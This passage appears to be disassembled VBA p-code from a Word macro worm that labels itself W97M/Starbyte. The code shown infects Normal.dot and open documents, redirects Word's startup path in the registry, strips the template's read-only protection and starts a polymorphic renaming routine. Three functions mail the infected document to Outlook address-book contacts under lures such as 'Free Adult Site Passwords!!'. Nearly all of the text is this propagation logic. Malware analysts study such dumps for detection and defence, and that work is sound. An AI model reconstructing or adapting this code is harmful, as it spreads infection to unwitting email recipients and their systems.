' 	Ld V 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #34:
' 	LitStr 0x0011 "C:\Windows\System"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #35:
' 	LitStr 0x0011 "C:\Windows\System"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	Ld V 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #38:
' 	LitStr 0x0012 "C:\Windows\Command"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #39:
' 	LitStr 0x0012 "C:\Windows\Command"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	Ld V 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #42:
' 	LitStr 0x0010 "C:\Program Files"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #43:
' 	LitStr 0x0010 "C:\Program Files"
' 	LitStr 0x0000 ""
' 	LitStr 0x003C "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options"
' 	LitStr 0x000C "STARTUP-PATH"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St r 
' Line #45:
' 	Ld r 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed Filename 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	Ld r 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #49:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\WordTemp.dot"
' 	Add 
' 	ParamNamed Filename 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #50:
' 	EndIfBlock 
' Line #51:
' 	Ld r 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000B "\Add-in.dot"
' 	Add 
' 	ParamNamed Filename 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	Label checkmy 
' Line #56:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #57:
' 	LitDI2 0x0001 
' 	Ld FileID 
' 	LineInput 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #60:
' 	ArgsCall (Call) ID_check 0x0000 
' Line #61:
' 	Ld Hostinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #62:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #63:
' 	StartWithExpr 
' 	Ld FileID 
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #64:
' 	EndWith 
' Line #65:
' 	EndWith 
' Line #66:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #67:
' 	EndIfBlock 
' Line #68:
' 	Ld FileInf 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #69:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #70:
' 	StartWithExpr 
' 	Ld FileID 
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #71:
' 	EndWith 
' Line #72:
' 	EndWith 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #76:
' 	EndFunc 
' Line #77:
' 	FuncDefn (Function Worm())
' Line #78:
' 	QuoteRem 0x0001 0x000C " For Outlook"
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #81:
' 	Dim 
' 	VarDefn Z
' Line #82:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #83:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0003 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Z 
' Line #84:
' 	Ld Z 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Cancer 0x0000 
' 	EndIf 
' Line #85:
' 	Ld Z 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Adult 0x0000 
' 	EndIf 
' Line #86:
' 	Ld Z 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Jokes 0x0000 
' 	EndIf 
' Line #87:
' 	EndFunc 
' Line #88:
' 	FuncDefn (Function Cancer())
' Line #89:
' 	OnError (Resume Next) 
' Line #90:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #91:
' 	Dim 
' 	VarDefn SadAgnuOutlook
' 	VarDefn Sadmapiname
' 	VarDefn Spawnme
' Line #92:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set SadAgnuOutlook 
' Line #93:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld SadAgnuOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set Sadmapiname 
' Line #94:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x001D "W2KM/Starbyte...W97M/Starbyte"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000C "by Lucky2000"
' 	Ne 
' 	IfBlock 
' Line #95:
' Line #96:
' 	Ld SadAgnuOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #97:
' 	LitStr 0x0005 "Guest"
' 	LitStr 0x0008 "password"
' 	Ld Sadmapiname 
' 	ArgsMemCall Logon 0x0002 
' Line #98:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sadmapiname 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #99:
' 	SetStmt 
' 	Ld y 
' 	Ld Sadmapiname 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #100:
' 	LitDI2 0x0001 
' 	St X 
' Line #101:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld SadAgnuOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Spawnme 
' Line #102:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #103:
' 	Ld X 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #104:
' 	Ld Peep 
' 	Ld Spawnme 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #105:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Add 
' 	St X 
' Line #106:
' 	Ld X 
' 	LitDI2 0x004B 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #107:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #108:
' 	LitStr 0x0012 "Can I help you ???"
' 	Ld Spawnme 
' 	MemSt Subject 
' Line #109:
' 	LitStr 0x003D "Ok...I help you...To make our PC are Infected by STARBYTE !!!"
' 	Ld Spawnme 
' 	MemSt Body 
' Line #110:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld Spawnme 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #111:
' 	Ld Spawnme 
' 	ArgsMemCall Send 0x0000 
' Line #112:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #113:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #114:
' 	Ld Sadmapiname 
' 	ArgsMemCall Logoff 0x0000 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	LitStr 0x0009 "Lucky2000"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x001D "W2KM/Starbyte...W97M/Starbyte"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	EndFunc 
' Line #119:
' 	FuncDefn (Function Adult())
' Line #120:
' 	OnError (Resume Next) 
' Line #121:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #122:
' 	Dim 
' 	VarDefn SadAgnuOutlook
' 	VarDefn Sadmapiname
' 	VarDefn Spawnme
' Line #123:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set SadAgnuOutlook 
' Line #124:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld SadAgnuOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set Sadmapiname 
' Line #125:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x001D "W2KM/Starbyte...W97M/Starbyte"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Lucky2000"
' 	Ne 
' 	IfBlock 
' Line #126:
' Line #127:
' 	Ld SadAgnuOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #128:
' 	LitStr 0x0005 "Guest"
' 	LitStr 0x0008 "password"
' 	Ld Sadmapiname 
' 	ArgsMemCall Logon 0x0002 
' Line #129:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sadmapiname 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #130:
' 	SetStmt 
' 	Ld y 
' 	Ld Sadmapiname 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #131:
' 	LitDI2 0x0001 
' 	St X 
' Line #132:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld SadAgnuOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Spawnme 
' Line #133:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #134:
' 	Ld X 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #135:
' 	Ld Peep 
' 	Ld Spawnme 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #136:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Add 
' 	St X 
' Line #137:
' 	Ld X 
' 	LitDI2 0x004B 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #138:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #139:
' 	LitStr 0x001B "Free Adult Site Passwords!!"
' 	Ld Spawnme 
' 	MemSt Subject 
' Line #140:
' 	LitStr 0x0078 "Free inside attached Document are over 50 Adult Verify Passwords!!  Use for your deepest desires!! Adults Only Please..."
' 	Ld Spawnme 
' 	MemSt Body 
' Line #141:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld Spawnme 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #142:
' 	Ld Spawnme 
' 	ArgsMemCall Send 0x0000 
' Line #143:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #144:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #145:
' 	Ld Sadmapiname 
' 	ArgsMemCall Logoff 0x0000 
' Line #146:
' 	EndIfBlock 
' Line #147:
' 	LitStr 0x0009 "Lucky2000"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x001D "W2KM/Starbyte...W97M/Starbyte"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #148:
' 	EndIfBlock 
' Line #149:
' 	EndFunc 
' Line #150:
' 	FuncDefn (Function Jokes())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #153:
' 	Dim 
' 	VarDefn SadAgnuOutlook
' 	VarDefn Sadmapiname
' 	VarDefn Spawnme
' Line #154:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set SadAgnuOutlook 
' Line #155:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld SadAgnuOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set Sadmapiname 
' Line #156:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x001D "W2KM/Starbyte...W97M/Starbyte"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0009 "Lucky2000"
' 	Ne 
' 	IfBlock 
' Line #157:
' Line #158:
' 	Ld SadAgnuOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #159:
' 	LitStr 0x0005 "Guest"
' 	LitStr 0x0008 "password"
' 	Ld Sadmapiname 
' 	ArgsMemCall Logon 0x0002 
' Line #160:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Sadmapiname 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #161:
' 	SetStmt 
' 	Ld y 
' 	Ld Sadmapiname 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #162:
' 	LitDI2 0x0001 
' 	St X 
' Line #163:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld SadAgnuOutlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Spawnme 
' Line #164:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #165:
' 	Ld X 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #166:
' 	Ld Peep 
' 	Ld Spawnme 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #167:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Add 
' 	St X 
' Line #168:
' 	Ld X 
' 	LitDI2 0x004B 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #169:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #170:
' 	LitStr 0x000E "Congratulation"
' 	Ld Spawnme 
' 	MemSt Subject 
' Line #171:
' 	LitStr 0x002E "Congratulation you WON a very funny Price !!  "
' 	Ld Spawnme 
' 	MemSt Body 
' Line #172:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld Spawnme 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #173:
' 	Ld Spawnme 
' 	ArgsMemCall Send 0x0000 
' Line #174:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #175:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #176:
' 	Ld Sadmapiname 
' 	ArgsMemCall Logoff 0x0000 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	LitStr 0x0009 "Lucky2000"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x001D "W2KM/Starbyte...W97M/Starbyte"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #179:
' 	EndIfBlock 
' Line #180:
' 	EndFunc 
' Line #181:
' 	FuncDefn (Function ID_check())
' Line #182:
' 	OnError (Resume Next) 
' Line #183:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #184:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #185:
' 	Do 
' Line #186:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #187:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #188:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	IfBlock 
' Line #189:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #190:
' 	Ld Virname 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo newname 
' 	EndIf 
' Line #191:
' 	Label newname 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #193:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #195:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	Ld Z 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo lost 
' 	EndIf 
' Line #198:
' 	Label lost 
' Line #199:
' 	StartForVariable 
' 	Ld Z 
' 	EndForVariable 
' 	NextVar 
' Line #200:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #202:
' 	Dim 
' 	VarDefn Let
' Line #203:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #204:
' 	Do 
' Line #205:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #206:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #207:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo skip 
' 	EndIf 
' Line #208:
' 	Ld Let 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Hostinf 
' 	BoS 0x0000 
' 	GoTo doccheck 
' 	EndIf 
' Line #209:
' 	Label skip 
' Line #210:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #211:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #212:
' 	LitVarSpecial (False)
' 	St Hostinf 
' Line #213:
' 	Label doccheck 
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #215:
' 	LitStr 0x001C "C:\windows\system\FixDvr.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #216:
' 	Do 
' Line #217:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #218:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #219:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nope 
' 	EndIf 
' Line #220:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St FileInf 
' 	BoS 0x0000 
' 	GoTo leave 
' 	EndIf 
' Line #221:
' 	Ld Let 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	Ld Virname 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St FileInf 
' 	BoS 0x0000 
' 	EndIf 
' Line #222:
' 	Label nope 
' Line #223:
' 	StartForVariable 
' 	Ld Let 
' 	EndForVariable 
' 	NextVar 
' Line #224:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #225:
' 	LitVarSpecial (False)
' 	St FileInf 
' Line #226:
' 	Label leave 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #228:
' 	EndFunc 
' Line #229:
' 	FuncDefn (Function Status_Of_Armor())
' Line #230:
' 	OnError (Resume Next) 
' Line #231:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #232:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Armor 
' 	EndIf 
' Line #233:
' 	Label Offense 
' Line #234:
' 	Ld Armor 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' 	EndIf 
' Line #235:
' 	LitVarSpecial (False)
' 	St Armor 
' Line #236:
' 	EndFunc 
' Line #237:
' 	FuncDefn (Function Code_Transportation())
' Line #238:
' 	OnError (Resume Next) 
' Line #239:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #240:
' 	LitStr 0x001E "C:\windows\system\Exchange.cpl"
' 	ArgsLd Dir 0x0001 
' 	St FExport 
' Line #241:
' 	Ld FExport 
' 	LitStr 0x000C "Exchange.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Ex_Yes 
' 	EndIf 
' Line #242:
' 	Ld Ex_Yes 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Morph_ME 
' 	Else 
' 	BoSImplicit 
' 	GoTo Recognize 
' 	EndIf 
' Line #243:
' 	Label Morph_ME 
' Line #244:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #245:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St q 
' Line #246:
' 	StartForVariable 
' 	Ld vi 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld q 
' 	For 
' Line #247:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St X 
' Line #248:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #249:
' 	Ld X 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #250:
' 	Ld X 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #251:
' 	Ld X 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #252:
' 	Ld X 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #253:
' 	Ld X 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #254:
' 	Ld X 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #255:
' 	Ld X 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #256:
' 	Ld X 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #257:
' 	Ld X 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #258:
' 	Ld X 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #259:
' 	Ld X 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #260:
' 	Ld X 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #261:
' 	Ld X 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #262:
' 	Ld X 
